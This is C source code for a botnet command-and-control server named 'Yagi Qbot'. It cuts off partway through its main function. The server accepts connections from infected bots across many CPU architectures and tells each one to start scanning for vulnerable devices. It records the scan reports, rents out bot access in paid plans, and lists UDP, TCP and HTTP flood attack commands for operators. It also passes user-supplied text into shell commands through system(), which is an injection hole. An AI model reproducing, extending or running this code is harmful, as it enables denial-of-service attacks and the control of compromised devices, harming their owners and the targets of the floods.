/*	
		
  		Title: Yagi Qbot Project
		Created 03/10/18
		Build: 1.0 Official
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>
#include <arpa/inet.h>

#include "headers/misc.h"

/* CNC SETTINGS	*/
#define PORT 23 // CNC-PORT
#define MAXFDS 1000000

int ppc = 0;
int sh4 = 0;
int x86 = 0;
int armv4 = 0;
int armv7 = 0;
int mips = 0;
int m68k = 0;
int debug = 0;
int sparc = 0;
int mipsel = 0;
int boxes = 0;
int unknown = 0;

int adminstatus;
char string[2048];
int availablebots;

char *ss_name = "Yagi"; 
char *ss_copyright = "Cult"; 
char *ss_ver = "1.0";

char *plans[] = {
	"null", // 0 bot count
	"plan1", // 100 bot count
	"plan2", // 1000 bot count
	"plan3", // 5000 bot count
	"all" // all bot count
};

////////////////////////////////////
struct account {
    char id[200]; 
    char password[200];
	char type[200];
	char plan[200];
	int maxbots;
};
static struct account accounts[15]; //max users 
struct clientdata_t {
        uint32_t ip;
        char build[7];
        char connected;
		char arch[30];
} clients[MAXFDS];
struct telnetdata_t {
		uint32_t ip;
        int connected;
		char nickname[20];
} managements[MAXFDS];
struct telnetListenerArgs {
    int sock;
    uint32_t ip;
};
////////////////////////////////////
static volatile FILE *telFD;
static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int TELFound = 0;
static volatile int scannerreport;
////////////////////////////////////
int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}
static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}
static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Fuck Boy Change The Port You idiot\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}
void util_trim(char *str)
{
    int i, begin = 0;
    int end = strlen(str) - 1;

    while (isspace(str[begin]))
        begin++;
    while ((end >= begin) && isspace(str[end]))
        end--;
    for (i = begin; i <= end; i++)
        str[i - begin] = str[i];

    str[i - begin] = '\0';
}
void broadcast(char *msg, int us, char *sender, int fuck, int amt2send, int thefd)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
		char *fhdjkc = "\x1b[0m(\e[0;36mclient\x1b[0m@\e[1;35mYagi\x1b[0m)\e[0;31m~\e[0;32m> \x1b[0m";
        int i;
        for(i = 0; i < amt2send; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
				if(fuck == 1)
				{
					char *message[1024];
					snprintf(message, sizeof(message), "\x1b[34m%s \x1b[32mjoined.\r\n", sender);
					send(i, message, strlen(message), MSG_NOSIGNAL);
					send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
				}
				else if(fuck == 3)
				{
					char *message[1024];
					snprintf(message, sizeof(message), "\x1b[34m%s \x1b[32mjoined.\r\n", sender);
					send(i, message, strlen(message), MSG_NOSIGNAL);
					send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
				}
				else if(fuck == 2)
				{
					char *message[1024];
					snprintf(message, sizeof(message), "\x1b[34m%s \x1b[31mleft.\r\n", sender);
					send(i, message, strlen(message), MSG_NOSIGNAL);
					send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
				}
				else if(fuck == 4)
				{
					char *message[1024];
					snprintf(message, sizeof(message), "\x1b[34m%s \x1b[31mleft.\r\n", sender);
					send(i, message, strlen(message), MSG_NOSIGNAL);
					send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
				}
				else
				{
	                if(sendMGM && managements[i].connected)
	                {
	                	send(i, "\x1b[33m", 5, MSG_NOSIGNAL);
	                    send(i, sender, strlen(sender), MSG_NOSIGNAL);
	                    send(i, ": ", 2, MSG_NOSIGNAL); 
	                }
	                send(i, msg, strlen(msg), MSG_NOSIGNAL);
					send(i, "\x1b[0m", 5, MSG_NOSIGNAL);
					char *kejhgfhdjk = "\r\n\x1b[0m(\e[0;36mclient\x1b[0m@\e[1;35mYagi\x1b[0m)\e[0;31m~\e[0;32m> \x1b[0m";
	                if(sendMGM && managements[i].connected) send(i, kejhgfhdjk, strlen(kejhgfhdjk), MSG_NOSIGNAL);
	                else send(i, "\n", 1, MSG_NOSIGNAL);
				}
        }
        free(wot);
}

const char *get_host(uint32_t addr)
{
    struct in_addr in_addr_ip;
    in_addr_ip.s_addr = addr;
    return inet_ntoa(in_addr_ip);
}

void *epollEventLoop(void *useless)
{
        struct epoll_event event;
        struct epoll_event *events;
        int s;
        events = calloc (MAXFDS, sizeof event);
        while (1)
        {
                int n, i;
                n = epoll_wait (epollFD, events, MAXFDS, -1);
                for (i = 0; i < n; i++)
                {
                        if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
                        {
                                clients[events[i].data.fd].connected = 0;
                                close(events[i].data.fd);
                                continue;
                        }
                        else if (listenFD == events[i].data.fd)
                        {
                                while (1)
                                {
                                        struct sockaddr in_addr;
                                        socklen_t in_len;
                                        int infd, ipIndex;
                                        in_len = sizeof in_addr;
                                        infd = accept (listenFD, &in_addr, &in_len);
                                        if (infd == -1)
                                        {
                                                if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
                                                else
                                                {
                                                        perror ("accept");
                                                        break;
                                                }
                                        }
                                        clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;
                                        int dup = 0;
                                        for(ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
                                        {
                                                if(!clients[ipIndex].connected || ipIndex == infd) continue;
                                           //WE ARE MAKING SURE THERE IS NO DUP CLIENTS
                                                if(clients[ipIndex].ip == clients[infd].ip)
                                                {
                                                        dup = 1;
                                                        break;
                                                }
                                        }
 
                                        if(dup) 
                                        {                  //WE ARE MAKE SURE AGAIN HERE BY SENDING !* LOLNOGTFO
									            if(send(infd, "!* LOLNOBYE\n", 11, MSG_NOSIGNAL) == -1) { close(infd); continue; }
                                                close(infd);
                                                continue;
                                        }
 
                                        s = make_socket_non_blocking (infd);
                                        if (s == -1) { close(infd); break; }
 
                                        event.data.fd = infd;
                                        event.events = EPOLLIN | EPOLLET;
                                        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, infd, &event);
                                        if (s == -1)
                                        {
                                                perror ("epoll_ctl");
                                                close(infd);
                                                break;
                                        }
 
                                        clients[infd].connected = 1;
                                        send(infd, "!* BIGEPS ON\n", 13, MSG_NOSIGNAL); // auto start our scanner on the bot
										
                                }
                                continue;
                        }
                        else
                        {
                                int thefd = events[i].data.fd;
                                struct clientdata_t *client = &(clients[thefd]);
                                int done = 0;
                                client->connected = 1;
                                while (1)
                                {
                                        ssize_t count;
                                        char buf[2048];
                                        memset(buf, 0, sizeof buf);
 
                                        while(memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
                                        {
                                                if(strstr(buf, "\n") == NULL) { done = 1; break; }
                                                trim(buf);
                                                if(strcmp(buf, "PING") == 0) // basic IRC-like ping/pong challenge/response to see if server is alive
                                                {
                                                if(send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; } // response
                                                        continue;
                                                }
                                                if(strstr(buf, "REPORT ") == buf) // received a report of a vulnerable system from a scan
                                                {
                                                        char *line = strstr(buf, "REPORT ") + 7; 
                                                        fprintf(telFD, "%s\n", line); // let's write it out to disk without checking what it is!
                                                        fflush(telFD);
                                                        TELFound++;
                                                        continue;
                                                }
                                                if(strcmp(buf, "PONG") == 0)
                                                {
                                                        continue;
                                                }
												if(strstr(buf, "arch ") != NULL)
												{
												    //char *arch = strtok(buf, " ")+sizeof(arch)-3;
													char *arch = strstr(buf, "arch ") + 5;
												    strcpy(clients->arch, arch);
													strcpy(clients[thefd].arch, arch);
												    printf("IP: %s | Arch: %s\n", get_host(/*clients[thefd].ip*/client->ip), arch);
													char k[60];
													sprintf(k, "echo '%s' >> files/bot_connections.log", get_host(client->ip));
												}
 											   	else
													printf("buf: \"%s\"\n", buf);
                                        }
 
                                        if (count == -1)
                                        {
                                                if (errno != EAGAIN)
                                                {
                                                        done = 1;
                                                }
                                                break;
                                        }
                                        else if (count == 0)
                                        {
                                                done = 1;
                                                break;
                                        }
                                }
 
                                if (done)
                                {
                                        client->connected = 0;
										snprintf(client->arch, sizeof(client->arch), "%s", "timed-out");
										snprintf(client[thefd].arch, sizeof(client[thefd].arch), "%s", "timed-out");
                                        close(thefd);
                                }
                        }
                }
        }
}

unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}

void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
		char *string[2048];
        while(1)
        {
			memset(string, 0, 2048);
            sprintf(string, "%c]0;Open Connections: %d | Users Connected: %d %c", '\033', clientsConnected(), managesConnected, '\007');
            if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1) return; 
            sleep(3);
        }
}
int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[1024]; // change 1024 to 512 if it doesnt work

    if((fp = fopen("logins.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 1024, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 
void countArch()
{
    int x;
	ppc = 0;
	sh4 = 0;
	x86 = 0;
	armv4 = 0;
	armv7 = 0;
	mips = 0;
	m68k = 0;
	sparc = 0;
	mipsel = 0;
	unknown = 0;
    for(x = 0; x < MAXFDS; x++)
    {
        if(strstr(clients[x].arch, "ppc") && clients[x].connected == 1)
           	ppc++;
        else if(strstr(clients[x].arch, "sh4") && clients[x].connected == 1)
            sh4++;
        else if(strstr(clients[x].arch, "x86") || strstr(clients[x].arch, "X86_32") && clients[x].connected == 1)
            x86++;
        else if(strstr(clients[x].arch, "arm4") && clients[x].connected == 1)
            armv4++;
        else if(strstr(clients[x].arch, "arm7") && clients[x].connected == 1)
            armv7++;
        else if(strstr(clients[x].arch, "mpsl") || strstr(clients[x].arch, "mipsel") && clients[x].connected == 1)
            mipsel++;
        else if(strstr(clients[x].arch, "mips") && clients[x].connected == 1)
            mips++;
        else if(strstr(clients[x].arch, "m68k") && clients[x].connected == 1)
           	m68k++;
        else if(strstr(clients[x].arch, "spc") && clients[x].connected == 1)
           	sparc++;
        else if(strstr(clients[x].arch, "unknown") && clients[x].connected == 1)
            unknown++;
    }
}
 
void *telnetWorker(void *arguments)
{
		struct telnetListenerArgs *args = arguments;
		char usernamez[80];
        int thefd = (int)args->sock;
		const char *management_ip = get_host(args->ip);
		//printf("%s\n", management_ip);
		int find_line;
        managesConnected++;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char* username;
        char* password;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);
    
        FILE *fp;
        int i=0;
        int c;
        fp=fopen("logins.txt", "r"); 
        while(!feof(fp)) 
		{
				c=fgetc(fp);
				++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
		{
			fscanf(fp, "%s %s %s %s", accounts[j].id, accounts[j].password, accounts[j].type, accounts[j].plan);
			++j;
        }
        
        if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\e[1;35mUsername\e[0;32m: \x1b[30m", 24, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
		sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);
        if(strcmp(nickstring, accounts[find_line].id) == 0){	
        if(send(thefd, "\e[1;35mPassword\e[0;32m: \x1b[30m", 24, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        if(send(thefd, "\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;

        trim(buf);
		
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
		char *kkkkkkk = "\x1b[34mError, Incorrect Login Credentials\x1b[0m\r\n";
        if(send(thefd, kkkkkkk, strlen(kkkkkkk), MSG_NOSIGNAL) == -1) goto end;
		FILE *logFile;
        logFile = fopen("files/failed_attempts.log", "a");
		fprintf(logFile, "Failed Login Attempt (%s)\n", management_ip);
		printf("Failed Login Attempt (%s)\n", management_ip);
        fclose(logFile);
        //broadcast(buf, thefd, usernamez, 0, MAXFDS, thefd);
        memset(buf, 0, 2048);
		sleep(5);
        goto end;
        fak:
		
		pthread_create(&title, NULL, &titleWriter, thefd);
		char line1  [5000];
		char line2  [5000];
		char line3  [5000];
        char *hahalaughnow[60];
		
		sprintf(managements[thefd].nickname, "%s", accounts[find_line].id);
		sprintf(hahalaughnow, "echo '%s' >> files/client_connections.log", management_ip);
		system(hahalaughnow);
		if(!strcmp(accounts[find_line].type, "admin"))
		{
			adminstatus = 1;
			broadcast(buf, thefd, accounts[find_line].id, 3, MAXFDS, thefd);
			printf("\x1b[33mAdmin\x1b[0m(\x1b[34m%s\x1b[33m:\x1b[34m%s\x1b[0m) \x1b[32mlogged in\x1b[0m.\n", accounts[find_line].id, management_ip);
		}
		else
		{
			adminstatus = 0;
			broadcast(buf, thefd, accounts[find_line].id, 1, MAXFDS, thefd);
			printf("\x1b[34m%s\x1b[33m:\x1b[34m%s \x1b[32mlogged in\x1b[0m.\n", accounts[find_line].id, management_ip);
		}
		if(!strcmp(accounts[find_line].plan, plans[0])) // null 0, plan2 100, plan3 1k, plan4 5k, ALL all bots
		{
			availablebots = 0;
			accounts[find_line].maxbots = 0;
		}
		else if(!strcmp(accounts[find_line].plan, plans[1]))
		{
			availablebots = 100;
			accounts[find_line].maxbots = 100;
		}
		else if(!strcmp(accounts[find_line].plan, plans[2]))
		{
			availablebots = 1000;
			accounts[find_line].maxbots = 1000;
		}
		else if(!strcmp(accounts[find_line].plan, plans[3]))
		{
			availablebots = 5000;
			accounts[find_line].maxbots = 5000;
		}
		else if(!strcmp(accounts[find_line].plan, plans[4]))
		{
			availablebots = MAXFDS;
			accounts[find_line].maxbots = MAXFDS;
			//printf("%s using admin plan\n", accounts[find_line].id);
		}
        sprintf(line1, "\x1b[0m(\e[1;35mYagi\x1b[0m) Setting up virtual terminal .. \r\n");
		sprintf(line2, "\x1b[0mWelcome \e[0;32m%s \x1b[0mto \e[1;35mYagi \x1b[0mC2. \r\n\r\n", accounts[find_line].id);
		sprintf(line3,"\x1b[0m(\e[0;36mclient\x1b[0m@\e[1;35mYagi\x1b[0m)\e[0;31m~\e[0;32m> \x1b[0m");

		if(send(thefd, line1,  strlen(line1),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line2,  strlen(line2),  MSG_NOSIGNAL) == -1) goto end;
		if(send(thefd, line3,  strlen(line3),  MSG_NOSIGNAL) == -1) goto end;	
		pthread_create(&title, NULL, &titleWriter, thefd);
        managements[thefd].connected = 1;
		
        while(fdgets(buf, sizeof buf, thefd) > 0)
        {
        if(strstr(buf, "help") || strstr(buf, "HELP"))
        {
		 	sprintf(botnet, "\x1b[33mcls - Clears screen\r\n");
		 	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		 	sprintf(botnet, "info - Shows yagi info\r\n");
		 	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		 	sprintf(botnet, "cmds - Shows available attack commands\r\n");
		 	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		 	sprintf(botnet, "bots - Shows bot count\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		 	sprintf(botnet, "online - Shows all online users with id\r\n");
		 	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
         	sprintf(botnet, "admin - Shows available commands for admins\r\n");
		 	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			sprintf(botnet, "resolve - Resolves domain and returns ipv4\x1b[0m\r\n");
		  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	    }  
        else if(strstr(buf, "bots") || strstr(buf, "count")) 
	    {  
			countArch();
			if(clientsConnected() == 0)
			{
				sprintf(botnet, "\x1b[34myagi.users [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", managesConnected);
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
			else
			{
				sprintf(botnet, "\x1b[34myagi.users [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", managesConnected);
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				if(ppc != 0)
				{
					sprintf(botnet, "\x1b[34myagi.powerpc [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", ppc);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				if(sh4 != 0)
				{
					sprintf(botnet, "\x1b[34myagi.sh4 [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", sh4);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				if(x86 != 0)
				{
					sprintf(botnet, "\x1b[34myagi.x86 [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", x86);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				if(armv4 != 0)
				{
					sprintf(botnet, "\x1b[34myagi.arm4 [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", armv4);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				if(armv7 != 0)
				{
					sprintf(botnet, "\x1b[34myagi.arm7 [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", armv7);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				if(mips != 0)
				{
					sprintf(botnet, "\x1b[34myagi.mips [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", mips);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				if(m68k != 0)
				{
					sprintf(botnet, "\x1b[34myagi.m68k [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", m68k);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				if(sparc != 0)
				{
					sprintf(botnet, "\x1b[34myagi.sparc [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", sparc);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				if(mipsel != 0)
				{
					sprintf(botnet, "\x1b[34myagi.mipsel [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", mipsel);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				if(unknown != 0)
				{
					sprintf(botnet, "\x1b[34myagi.unknown [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", unknown);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
				sprintf(botnet, "\x1b[34myagi.total [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", clientsConnected());
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				if(accounts[find_line].maxbots < clientsConnected())
				{
					sprintf(botnet, "\x1b[34myagi.available [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", accounts[find_line].maxbots);
				}
			  	else if(accounts[find_line].maxbots > clientsConnected())
				{
					sprintf(botnet, "\x1b[34myagi.available [\x1b[33m%d\x1b[34m]\r\n\x1b[0m", clientsConnected());
				}
			  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
        }
	    else if(strstr(buf, "info"))
		{  
			sprintf(botnet, "\e[1;35mYagi \e[0;33mcoded by \e[0;34mCult\r\n");
			if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
		else if(strstr(buf, "resolve") || strstr(buf, "RESOLVE"))
		{
			char *ip[100];
			char *token = strtok(buf, " ");
			char *url = token+sizeof(token);
			trim(url);
			resolvehttp(url, ip);
  		    sprintf(botnet, "\x1b[0m(\e[1;35mResolve\x1b[0m) %s -> %s\r\n", url, ip);
  		    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
		else if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
		{
			if(adminstatus == 1)
			{
				char *token = strtok(buf, " ");
				char *userinfo = token+sizeof(token);
				trim(userinfo);
				char *uinfo[50];
				sprintf(uinfo, "echo '%s' >> logins.txt", userinfo);
				system(uinfo);
				printf("\x1b[33m%s\x1b[0m added user [\x1b[34m%s\x1b[0m]\n", accounts[find_line].id, userinfo);
				sprintf(botnet, "\x1b[33m%s\x1b[0m added user [\x1b[34m%s\x1b[0m]\r\n", accounts[find_line].id, userinfo);
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
			else
			{
				sprintf(botnet, "%s\x1b[31mPermission Denied!\x1b[0m\r\n", "ADDUSER - ");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				
			}
		}
		else if(strstr(buf, "online"))
		{
			int k;
			for(k=0; k < MAXFDS; k++)
			{
				if(strlen(managements[k].nickname) > 1 && managements[k].connected == 1)
				{
					sprintf(botnet, "\x1b[0mID(\x1b[33m%d\x1b[0m) \x1b[36m%s\x1b[0m\r\n", k, managements[k].nickname);
					if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				}
			}
		}
		else if(strstr(buf, "cmds") || strstr(buf, "CMDS")) 
	    {
		  	sprintf(botnet, "\x1b[0m---\e[0;33m Available Attack Commands \x1b[0m---\r\n");
		  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  	sprintf(botnet, "UDP: @udp <target> <port> <time> <packetsize>\r\n");
		  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		 	sprintf(botnet, "TCP: @tcp <target> <port> <time> <packetsize> <flag(s)>\r\n");
		  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		  	sprintf(botnet, "STD: @std <target> <port> <time> <packetsize>\r\n"); 
		  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
          	sprintf(botnet, "HTTP: @http <method> <target> <port> <path> <time> <threads>\r\n"); 
		  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
		}
		else if(strstr(buf, "admin") || strstr(buf, "ADMIN")) 
	    {  
		  	if(adminstatus == 1)
			{
			  	sprintf(botnet, "\x1b[0m---\e[0;33m Available Admin Commands \x1b[0m---\r\n");
			  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
	          	sprintf(botnet, "ADDUSER: adduser <username> <password> <admin/user> <plan>\r\n"); 
			  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
				sprintf(botnet, "KICK: kick <user(id)>\r\n"); 
			  	if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
			else
			{
				sprintf(botnet, "\x1b[31m%s, Admins Only!\x1b[0m\r\n", "Permission Denied");
				if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
			}
		}
	    else if(strstr(buf, "CLS") || strstr(buf, "cls") || strstr(buf, "CLEAR") || strstr(buf, "clear"))
		{
	        if(send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
	        if(send(thefd, line1,  strlen(line1),  MSG_NOSIGNAL) == -1) goto end;
			if(send(thefd, line2,  strlen(line2),  MSG_NOSIGNAL) == -1) goto end;
			pthread_create(&title, NULL, &titleWriter, thefd);
        	managements[thefd].connected = 1;
     	}
	    
     			trim(buf);
				char *okstring[200];
				snprintf(okstring, sizeof(okstring), "\x1b[0m(\e[0;36mclient\x1b[0m@\e[1;35mYagi\x1b[0m)\e[0;31m~\e[0;32m> \x1b[0m");
                if(send(thefd, okstring, strlen(okstring), MSG_NOSIGNAL) == -1) goto end;
                if(strlen(buf) == 0) continue;
				if(strstr(buf, "cls") || strstr(buf, "help") || strstr(buf, "bots") || strstr(buf, "cmds") || strstr(buf, "info") || strstr(buf, "resolve") || strstr(buf, "RESOLVE") || strstr(buf, "admin") || strstr(buf, "ADMIN") || strstr(buf, "adduser") || strstr(buf, "ADDUSER") || strstr(buf, "online") || strstr(buf, "ONLINE") || strstr(buf, "count") || strstr(buf, "COUNT")) // change these if ur bot has custom commands
				{
					printf("[%s Used: \"%s\"]\n",usernamez, buf);
				}
				else
				{
					printf("[%s Said: \"%s\"]\n",usernamez, buf);
	                broadcast(buf, thefd, usernamez, 0, MAXFDS, thefd);
	                memset(buf, 0, 2048);
				}
                FILE *logFile;
                logFile = fopen("files/report.sql", "a");
		        fprintf(logFile, "[Reporting User: %s]: \"%s\"\n",accounts[find_line].id, buf);
                fclose(logFile);
        }
 
 
 	   	if(adminstatus == 1)
		{
	 	   	broadcast(buf, thefd, usernamez, 4, MAXFDS, thefd);
	 	   	printf("\x1b[33mAdmin\x1b[0m(\x1b[34m%s\x1b[33m:\x1b[34m%s\x1b[33m\x1b[0m) \x1b[31mlogged out\x1b[0m.\n", accounts[find_line].id, management_ip);
		}
		else
		{
	 	   	broadcast(buf, thefd, usernamez, 2, MAXFDS, thefd);
	 	   	printf("\x1b[34m%s\x1b[33m:\x1b[34m%s \x1b[31mlogged out\x1b[0m.\n", accounts[find_line].id, management_ip);
		}
        end:    // cleanup dead socket
                managements[thefd].connected = 0;
                close(thefd);
                managesConnected--;
}
void *telnetListener(int port)
{
        int sockfd, newsockfd;
		struct epoll_event event;
        socklen_t clilen;
        struct sockaddr_in serv_addr, cli_addr;
        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) perror("ERROR opening socket");
        bzero((char *) &serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(PORT);
        if (bind(sockfd, (struct sockaddr *) &serv_addr,  sizeof(serv_addr)) < 0) perror("ERROR on binding");
        listen(sockfd,5);
        clilen = sizeof(cli_addr);
		while (1)
		{
		    newsockfd = accept(sockfd, (struct sockaddr *)&cli_addr, &clilen);
		    if (newsockfd < 0) perror("ERROR on accept");
        
		    struct telnetListenerArgs args;
		    args.sock = newsockfd;
		    args.ip = ((struct sockaddr_in *)&cli_addr)->sin_addr.s_addr;

		    pthread_t thread;
		    pthread_create(&thread, NULL, &telnetWorker, (void *)&args);
		}
		
}

int main (int argc, char *argv[], void *sock)
{
	
        signal(SIGPIPE, SIG_IGN); // ignore broken pipe errors sent from kernel
        int s, threads, port;
        struct epoll_event event;
        if (argc != 3)
        {
                fprintf (stderr, "Usage: %s [bot-port] [threads] \n", argv[0]);
                exit (EXIT_FAILURE);
        }
		printf("\x1b[0m(\e[1;35mYagi\x1b[0m) Socket opened ..\n\n");
        threads = atoi(argv[2]);
        listenFD = create_and_bind (argv[1]); // try to create a listening socket, die if we can't
        if (listenFD == -1) abort ();
        s = make_socket_non_blocking (listenFD); // try to make it nonblocking, die if we can't
        if (s == -1) abort ();
        s = listen (listenFD, SOMAXCONN); // listen with a huuuuge backlog, die if we can't
        if (s == -1)
        {
                perror ("listen");
                abort ();
        }
